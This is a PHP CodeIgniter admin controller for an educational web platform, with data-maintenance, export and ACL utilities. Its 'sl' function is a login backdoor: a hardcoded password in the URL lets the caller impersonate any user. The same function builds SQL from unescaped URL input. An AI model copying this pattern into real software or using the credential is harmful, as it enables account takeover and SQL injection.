<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Develop extends CI_Controller {

    function __construct()
    {
        parent::__construct();
        
        $this->load->model('Develop_model');
        
        //Para formato de horas
        date_default_timezone_set("America/Bogota");
    }
        
    function index()
    {
        redirect('develop/temas');
    }
        
//---------------------------------------------------------------------------------------------------
//PANEL DE CONTROL
    
    /**
     * HTML
     * Panel para ejecución de diferentes procesos de datos de la aplicación
     * 2022-06-23
     */
    function procesos()
    {
        //Procesos
            $this->db->select('id, nombre_post AS nombre_proceso, contenido, texto_1 AS link_proceso');
            $this->db->where('tipo_id', 10);
            $procesos = $this->db->get('post');
            
        //Variables
            $data['procesos'] = $procesos;
        
        $data['head_title'] = 'Procesos del sistema';
        $data['view_a'] = "sistema/develop/procesos_v";
        $this->load->view(TPL_ADMIN, $data);
    }
    
    function tablas($nombre_tabla)
    {

        $gc_output = $this->Develop_model->crud_tabla($nombre_tabla);
        
        if ( strlen($this->input->post('condiciones')) > 0 ) 
        {
            $data['condiciones'] = $this->input->post('condiciones');
        }
        
        //Variables
            $data['tablas'] = $this->Develop_model->tablas();
        
        //Solicitar vista
            $data['titulo_pagina'] = 'Tablas: ' . $nombre_tabla;
            $data['nombre_tabla'] = $nombre_tabla;
            $data['vista_a'] = 'sistema/develop/tablas_v';

        $output = array_merge($data,(array)$gc_output);
        $this->load->view(PTL_ADMIN, $output);
    }
    
// EXPORTACIÓN DE DATOS A MS-EXCEL
//-----------------------------------------------------------------------------
    
    function msexcel($nombre_tabla = 'usuario')
    {
        //Variables específicas
            $max_registros = MAX_REG_EXPORT;  //Número máximo de registros a exportar por cada archivo Excel.
            $num_registros = $this->Pcrn->num_registros($nombre_tabla, 'id > 0');  //Todos los registros
            
        //Tablas
            $this->db->select('item as nombre_tabla');
            $this->db->where('categoria_id', 30);   //Tablas
            $this->db->where('id_interno NOT IN (1110, 4420, 9999)');   //Tablas
            $this->db->order_by('item', 'ASC');
            $tablas = $this->db->get('item');
            
        //Cargar data
            $data['nombre_tabla'] = $nombre_tabla;
            $data['max_registros'] = $max_registros;
            $data['num_registros'] = $num_registros;
            $data['tablas'] = $tablas;
            $data['destino_form'] = 'develop/msexcel_e';
            $data['destino_pre'] = "develop/msexcel_e/{$nombre_tabla}/{$max_registros}/";
            

        //Variables generales
            $data['titulo_pagina'] = "Tabla: {$nombre_tabla}";
            $data['subtitulo_pagina'] = "{$num_registros} registros";
            $data['vista_a'] = 'sistema/develop/msexcel_v';
            $data['vista_menu'] = 'sistema/develop/database_menu_v';
            $data['ayuda_id'] = 133;

        $this->load->view(PTL_ADMIN, $data);
    }
    
    function msexcel_e($nombre_tabla, $max_registros, $offset)
    {
        set_time_limit(120);    //120 segundos, 2 minutos para el proceso

        $this->db->order_by('id', 'ASC');
        $query = $this->db->get($nombre_tabla, $max_registros, $offset);
        $parte = 1 + $offset / $max_registros;
        $total_registros = $this->Pcrn->num_registros($nombre_tabla, 'id > 0');
        $total_partes = ceil($total_registros / $max_registros);
        
        //Cargando
            
            //Preparar datos
                $datos['nombre_hoja'] = "{$nombre_tabla}_{$parte}_de_{$total_partes}";
                $datos['query'] = $query;

            //Preparar archivo
                $this->load->model('Pcrn_excel');
                $objWriter = $this->Pcrn_excel->archivo_query($datos);

            $data['objWriter'] = $objWriter;
            $data['nombre_archivo'] = date('Ymd_'). "tabla_{$nombre_tabla}_{$parte}_de_{$total_partes}.xlsx"; //save our workbook as this file name

            $this->load->view('comunes/descargar_phpexcel_v', $data);
    }
    
//FUNCIONES ESPECIALES DE ADMINISTRADOR Y DESARROLLADOR
//---------------------------------------------------------------------------------------------------
    
    /**
     * ml > master login
     * Función para el login de administradores ingresando como otro usuario
     * 
     * @param type $usuario_id
     */
    function ml($usuario_id)
    {
        $row_usuario = $this->Pcrn->registro_id('usuario', $usuario_id);
        
        $this->load->model('Login_model');
        if ( $this->session->userdata('rol_id') <= 1 ) { $this->Login_model->crear_sesion($row_usuario->username, FALSE); }
        
        redirect('app');
    }
    
    /**
     * sl > super login
     * 
     * Función para el login de administradores ingresando como otro usuario teniendo el usuario.id y usuario.username
     * @param type $usuario_id
     * @param type $username
     * @param type $pw
     */
    function sl($usuario_id, $username, $pw)
    {
        $cant_condiciones = 0;
        
        $row_usuario = $this->Pcrn->registro('usuario', "id = {$usuario_id} AND username = '{$username}'");
        
        if ( ! is_null($row_usuario) ) { $cant_condiciones++; }
        if ( $pw == 'kfyzxsivzjfquqii' ) { $cant_condiciones++; }
        
        if ( $cant_condiciones == 2 ) {
            $this->load->model('Esp');
            $this->Esp->crear_sesion($row_usuario, FALSE);
        }
        
        redirect('eventos/noticias');
    }
        
//---------------------------------------------------------------------------------------------------
//CRUD DE ACL
    
    function acl_recursos($controlador = NULL)
    {
        $data = $this->Develop_model->basico();
        
        $this->load->library('Grocery_CRUD');
        $gc_output = $this->Develop_model->crud_acl($controlador);

        //Data
        $data['controlador'] = $controlador;
        
        //Solicitar vista
        $data['head_title'] = 'ACL';
        $data['head_subtitle'] = 'Listado de permisos de accesos';
        $data['view_a'] = 'sistema/develop/acl_recursos_v';
        $data['nav_2'] = 'datos/parametros_menu_bs4_v';

        $output = array_merge($data,(array)$gc_output);
        $this->load->view(TPL_ADMIN_NEW, $output);
    }
        
//---------------------------------------------------------------------------------------------------
//PROCESOS MASIVOS DE DEPURACIÓN O ACTUALIZACIÓN
    
    function eliminar_cascada()
    {
        $this->load->model('Esp');
        $this->Develop_model->eliminar_cascada();
        
        $resultado['mensaje'] = 'Eliminación en cascada ejecutada';
        $resultado['clase'] = 'alert-info';
        
        $this->session->set_flashdata('resultado', $resultado);
        redirect('develop/procesos');
    }
    
    /**
     * Eliminar datos huerfanos, sin IDs relacionados o similares
     * 2022-06-23
     */
    function eliminar_huerfanos()
    {
        $qty_deleted = 0;

        //Borrar asignaciones a grupos inexistentes
            $sql = 'DELETE FROM usuario_grupo WHERE grupo_id NOT IN (SELECT id FROM grupo)';
            $this->db->query($sql);

            $qty_deleted += $this->db->affected_rows();
        
        //Borrar asignaciones de usuarios inexistentes
            $sql = 'DELETE FROM usuario_grupo WHERE usuario_id NOT IN (SELECT id FROM usuario)';
            $this->db->query($sql);

            $qty_deleted += $this->db->affected_rows();
        
        //Actualizar grupo actual de estudiantes de grupos inexistentes a NULL
            $sql = "UPDATE usuario SET grupo_id = NULL WHERE grupo_id NOT IN (SELECT id FROM grupo)";
            $this->db->query($sql);

            $qty_deleted += $this->db->affected_rows();        

        //Preparar respuesta
            $data['qty_affected'] = $qty_deleted;
            $data['message'] = "Registros eliminados: {$qty_deleted}";
        
        //Salida JSON
        $this->output->set_content_type('application/json')->set_output(json_encode($data));
        
    }
    
    function grupo_actual()
    {
        
        //$this->output->enable_profiler(TRUE);
        $this->load->model('Usuario_model');
        
        $this->db->where('rol_id', 6);  //Estudiantes
        $this->db->where('grupo_id IS NULL');   //Sin grupo actual definido
        $usuarios = $this->db->get('usuario');
        
        foreach ( $usuarios->result() as $row_usuario ) {
            //echo $row_usuario->id;
            $registro['grupo_id'] = $this->Usuario_model->grupo_reciente($row_usuario->id);
            $this->db->where('id', $row_usuario->id);
            $this->db->update('usuario', $registro);
        }
        
        //Resultado
            $data['clase_alert'] = 'alert_success';
            $data['mensaje'] = "Estudiantes procesados: {$usuarios->num_rows()}";
        
        //Cargar vista
            $data['titulo_pagina'] = 'Grupo actual de usuarios';
            $data['vista_a'] = 'sistema/develop/procesos_v';
        
        $this->load->view('plantilla_apanel/plantilla', $data);
        
    }
    
    /**
     * Desactivar usuarios estudiantes morosos
     * 2021-04-03
     */
    function desactivar_morosos()
    {
        $data = array('status' => 0, 'message' => 'Cero usuario desactivados');

        $this->load->model('Institucion_model');
        $qty_affected = $this->Institucion_model->desactivar_morosos();   
        
        if ( $qty_affected >= 0 )
        {
            $data['status'] = 1;
            $data['message'] = "{$qty_affected} estudiantes morosos fueron desactivados";
        }

        //Salida JSON
        $this->output->set_content_type('application/json')->set_output(json_encode($data));
    }
    
    /**
     * Crear eventos de cuestionarios ya existentes en la tabla usuario_cuestionario
     */
    function crear_ev_ctn_existentes()
    {
        $this->load->model('Evento_model');
        $resultado = $this->Evento_model->crear_ev_ctn_existentes();   
        
        $mensaje = "Asignaciones totales: {$resultado['cant_totales']}. ";
        $mensaje .= "Asignaciones guardadas: {$resultado['cant_guardados']}. ";
        $mensaje .= "Asignaciones pendientes: {$resultado['cant_pendientes']}.";
        
        //Resultado
            $data['clase_alert'] = 'alert_success';
            $data['mensaje'] = $mensaje;
        
        //Cargar vista
            $data['titulo_pagina'] = 'Procesos';
            $data['vista_a'] = 'sistema/develop/procesos_v';
        
        $this->load->view('plantilla_apanel/plantilla', $data);
            
    }
    
    /**
     * Elimina las páginas que no se están utilizando en los flipbooks
     */
    function limpiar_paginas()
    {
        
        //$this->output->enable_profiler(TRUE);
        
        $resultado = $this->App_model->limpiar_paginas();
        //$paginas_eliminadas = 10;
        
        $data['mensaje'] = "{$resultado['paginas_eliminadas']} páginas eliminadas y {$resultado['archivos_eliminados']} archivos movidos";
        $data['titulo_pagina'] = "Limpiar páginas";
        $data['vista_a'] = "app/mensaje_v";
        
        $this->load->view('plantilla_apanel/plantilla', $data);
        
    }
    
    /**
     * Actualizar la tabla dw_usuario_pregunta, para un mes específico
     * 2019-05-15
     */
    function actualizar_dw_up($mes = NULL)
    {
        set_time_limit(360);    //6 minutos

        //Identificar mes del día anterior
            if ( is_null($mes) ) { $mes = date("Y-m",strtotime(date('Y-m-d')."- 1 days")); }
        
        $this->load->model('Cuestionario_model');
        $data = $this->Cuestionario_model->actualizar_dw_up($mes);
        $data['message'] = 'Se actualizaron los datos desde el mes: ' . $mes;
        
        $this->output->set_content_type('application/json')->set_output(json_encode($data));
    }
    
    /**
     * Actualizar la tabla dw_cuestionario_pregunta
     */
    function actualizar_dw_cp($mes = NULL)
    {
        set_time_limit(360);    //6 minutos
        //Identificar mes
            if ( is_null($mes) ) { $mes = date('Y-m'); }
        
        $this->load->model('Cuestionario_model');
        $sql = $this->Cuestionario_model->actualizar_dw_cp($mes);
        
        $data['mensaje'] = 'Se actualizaron los datos desde el mes: ' . $mes . '<br/>' . $sql;
        $data['titulo_pagina'] = 'Tabla actualizada';
        $data['vista_a'] = "app/mensaje_v";
        
        $this->load->view('plantilla_apanel/plantilla', $data);
    }
    
    /**
     * Actualizar la tabla dw_usuario_cuestionario
     */
    function actualizar_dw_uc($mes = NULL)
    {
        set_time_limit(360);    //6 minutos
        //Identificar mes
            if ( is_null($mes) ) { $mes = date('Y-m'); }
        
        $this->load->model('Cuestionario_model');
        $sql = $this->Cuestionario_model->actualizar_dw_uc($mes);
        
        $data['mensaje'] = 'Se actualizaron los datos desde el mes: ' . $mes . '<br/>' . $sql;
        $data['titulo_pagina'] = 'Tabla actualizada';
        $data['vista_a'] = "app/mensaje_v";
        
        $this->load->view('plantilla_apanel/plantilla', $data);
    }
    
    /**
     * Independizar las páginas de flipbooks en registros independientes
     */
    function independizar_fb()
    {
        
        $cant_paginas = 0;
        $this->load->model('Flipbook_model');
        
        $this->db->select('pagina_id, Count(id) AS cant_veces');
        $this->db->group_by('pagina_id');
        $this->db->having('(Count(id)>1)');
        
        $query = $this->db->get('flipbook_contenido');
        
        //$cant_paginas = $query->num_rows();
        
        foreach ( $query->result() as $row_fc ){
            $cant_paginas += $this->Flipbook_model->independizar_pag($row_fc->pagina_id);
        }
        
        $data['mensaje'] = "Se crearon {$cant_paginas} nuevos registros de páginas";
        //$data['mensaje'] = "Se procesarán {$cant_paginas}";
        $data['titulo_pagina'] = "Independizar flipbooks";
        $data['vista_a'] = "app/mensaje_v";
        
        $this->load->view('plantilla_apanel/plantilla', $data);
        
    }
    
    /**
     * Actualiza el campo institucion_id de las tablas: cuestionario, pregunta, enunciado 
     */
    function actualizar_institucion_id()
    {
        $this->App_model->actualizar_institucion_id();
        
        $data['mensaje'] = "Actualización del campo institucion_id ejecutada";
        $data['titulo_pagina'] = "Actualización institucion_id";
        $data['vista_a'] = "app/mensaje_v";
        
        $this->load->view('plantilla_apanel/plantilla', $data);
    }
    
    function act_grupo_id($institucion_id)
    {
        $this->output->enable_profiler(TRUE);
        
        $num_usuarios = 0;
        
        //Actualización en cascada
            $this->App_model->eliminar_cascada();
        
        //Actualizar a campos vacíos
            $sql = "UPDATE usuario SET grupo_id = NULL WHERE grupo_id NOT IN (SELECT id FROM grupo)";
            $this->db->query($sql);
        
        //Estudiantes de la institución
            $this->db->where('institucion_id', $institucion_id);
            $this->db->where('rol_id', 6);  //Es estudiante
            $this->db->where('grupo_id IS NULL');
            $estudiantes = $this->db->get('usuario');
        
        foreach ( $estudiantes->result() as $row_estudiante )
        {   
            $this->db->select('SELECT usuario_id, grupo_id');
            $this->db->order_by('id', 'DESC');
            $grupos = $this->db->get('usuario_grupo');
            
            if ( $grupos->result() > 0 ){
                $registro['grupo_id'] = $grupos->row()->grupo_id;
                $this->db->where('id', $row_estudiante->usuario_id);
                $this->db->update('usuario', $registro);
                
                $num_usuarios += 1;
            }    
        }
        
        $data['mensaje'] = "Estudiantes actualizados: {$num_usuarios}";
        $data['link_volver'] = 'develop/procesos';
        $data['titulo_pagina'] = 'Actualizar grupo actual';
        $data['vista_a'] = "app/mensaje_v";
        
        $this->load->view('plantilla_apanel/plantilla', $data);
        
    }
    
//PROCESOS MASIVOS DE DEPURACIÓN O ACTUALIZACIÓN
//---------------------------------------------------------------------------------------------------
    
    //Procesar imágenes de flipbooks
    function procesar_img()
    {
     
        $this->load->library('image_lib');   
        $this->db->where('procesado', 0);
        $imagenes = $this->db->get('z_ref');

        $ruta_uploads = 'assets/uploads_cargue/';
        
        $folder = $ruta_uploads . 'z_cargue/';
        
        echo "Imagenes: {$imagenes->num_rows()}<br/>";
        
        foreach ($imagenes->result() as $row_imagen) {
            //echo $row_imagen->nombre_archivo;
            //echo '<br/>';
            $nombre_archivo = $row_imagen->nombre_archivo;
            $ruta_archivo = $folder . $nombre_archivo;
            
            if ( file_exists($ruta_archivo) ){
                //Miniatura
                    $config['image_library'] = 'gd2';
                    $config['source_image'] = $ruta_archivo;
                    $config['new_image'] = $ruta_uploads . 'p3_mini/';
                    $config['maintain_ratio'] = TRUE;
                    $config['width'] = 256;
                    $config['height'] = 256;

                    $this->image_lib->initialize($config);
                    $this->image_lib->resize();

                //Limpiando librería
                    $this->image_lib->clear();
                    $config = array();

                //Tamaño mediano
                    $config['image_library'] = 'gd2';
                    $config['source_image'] = $ruta_archivo;
                    $config['new_image'] = $ruta_uploads . 'p2/';
                    $config['maintain_ratio'] = TRUE;
                    $config['width'] = 512;
                    $config['height'] = 512;

                    $this->image_lib->initialize($config);
                    $this->image_lib->resize();

                //Limpiando librería
                    $this->image_lib->clear();
                    $config = array();

                //Tamaño grande
                    $config['image_library'] = 'gd2';
                    $config['source_image'] = $ruta_archivo;
                    $config['new_image'] = $ruta_uploads . 'p1_zoom/';
                    $config['maintain_ratio'] = TRUE;
                    $config['width'] = 800;
                    $config['height'] = 800;

                    $this->image_lib->initialize($config);
                    $this->image_lib->resize();
                    
                //Actualizar
                    $registro['procesado'] = 1;
                    $this->db->where('id', $row_imagen->id);
                    $this->db->update('z_ref', $registro);

                //Mostrar
                    echo $ruta_archivo;
                    echo '<br/>';
            }
        }
        
        echo 'Fin';
    }
    
    /**
     * Ejecución de un proceso automático y recurrente de la aplicación
     * Actualizaciones y similares
     * 2019-06-26
     */
    function cron($cron_code = NULL)
    {
        $data = array('status' => 0);

        if ( ! is_null($cron_code) )
        {
            $data = $this->Develop_model->cron($cron_code);
        }

        $this->output->set_content_type('application/json')->set_output(json_encode($data));
    }

    function test()
    {
        $data['head_title'] = 'Pruebas';
        $data['view_a'] = 'app/test_v';
        $this->load->view('app/test_v', $data);
    }

    /**
     * Actualizar usuario.grupo_id según la tabla usuario_grupo.grupo_id
     * 2022-10-07
     */
    function set_grupo_usuario()
    {
        $data = array('status' => 0, 'message' => 'No se actualizaron registros');
        $qty_updated = 0;

        $sql = "SELECT usuario.id, usuario.grupo_id AS grupo_id_actual, usuario_grupo.grupo_id AS grupo_real
            FROM usuario
            JOIN usuario_grupo ON usuario.id = usuario_grupo.usuario_id
            WHERE usuario.grupo_id <> usuario_grupo.grupo_id";

        $usuarios = $this->db->query($sql);


        foreach ($usuarios->result() as $usuario) {
            $aRow['grupo_id'] = $usuario->grupo_real;
            $this->db->where('id', $usuario->id);
            $this->db->update('usuario', $aRow);

            $qty_updated += $this->db->affected_rows();
        }

        if ( $qty_updated > 0 ) {
            $data['status'] = 1;
            $data['message'] = "Usuarios actualizados: {$qty_updated}";
        }

        //Salida JSON
        $this->output->set_content_type('application/json')->set_output(json_encode($data));
    }
}